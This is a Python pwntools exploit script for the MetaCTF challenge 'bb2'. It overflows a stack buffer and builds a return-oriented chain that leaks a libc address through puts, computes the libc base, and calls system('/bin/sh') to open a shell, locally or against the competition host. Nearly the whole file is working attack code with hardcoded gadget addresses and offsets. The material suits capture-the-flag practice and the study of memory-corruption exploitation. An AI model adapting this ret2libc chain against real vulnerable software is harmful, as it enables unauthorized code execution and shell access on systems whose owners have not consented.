from pwn import *

# --- Info ---
# CTF: MetaCTF
# Date: *
# Challenge: bb2
# Description: ret2libc to leak libc and get shell
# --- End Info ---

HOST = 'host1.metaproblems.com'
PORT = 5152
PATH = './bb2'

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

REMOTE = 0

libc = ELF('./libc-2.28.so')
binary = ELF('./bb2')

if(REMOTE):
    r = remote(HOST, PORT)
else:
    r = process(['./ld-2.28.so',PATH], env={'LD_PRELOAD':'./libc-2.28.so'})

def pad(addr):
    return addr + '\x00'*(8-len(addr))

arbitrary_file = '/proc/1/timerslack_ns\x00'
main = 0x0000000000401192
pop_rdi = 0x000000000040133b
dummy_pops = 0x0000000000401338

offset = 48

r.recvuntil('to copy\n')

leak = '' + arbitrary_file
leak += 'A'*(offset - len(arbitrary_file))
leak += 'B'*8
leak += p64(pop_rdi)
leak += p64(binary.got['gets'])
leak += p64(binary.plt['puts'])
leak += p64(main)

r.sendline(leak)

#pause()

r.recvuntil('target file\n')

r.sendline(arbitrary_file[:-1])

r.recvuntil('successfully.\n')

data = r.recvuntil('\n')

leakx = u64(pad(data[:-1]))

r.recv()

libc.address = leakx - libc.symbols['_IO_gets']
log.info(f'Leaked: glibc base @ {hex(libc.address)}')
log.info('Leaked: system @ ' + hex(libc.symbols['system']))
log.info('Leaked: "/bin/sh" @ ' + hex(next(libc.search('/bin/sh'))))

payload = '' + arbitrary_file
payload += 'A'*(offset - len(arbitrary_file))
payload += 'B'*8
payload += p64(pop_rdi)
payload += p64(next(libc.search('/bin/sh')))
payload += p64(libc.symbols['system'])
payload += p64(main)

r.sendline(payload)

r.sendline(arbitrary_file[:-1])

r.recvuntil('successfully.\n')

#pause()

r.interactive()
r.close()

